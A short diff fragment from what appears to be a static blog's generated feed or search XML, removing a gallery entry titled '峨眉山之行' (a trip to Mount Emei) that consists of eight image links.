-        <content type="html"><![CDATA[<div class="justified-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg"><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg"><br><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg"><br><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg"><br><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg"><br><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg"><br><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg"><br><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg"></p>          </div>]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>峨眉山之行</title>
-      <link href="gallery/wallpaper/index.html"/>
-      <url>gallery/wallpaper/index.html</url>
       
         <content type="html"><![CDATA[<div class="justified-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg"><br><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg"><br><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg"><br><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg"><br><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg"><br><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg"><br><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg"><br><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg"></p>          </div>]]></content>
       
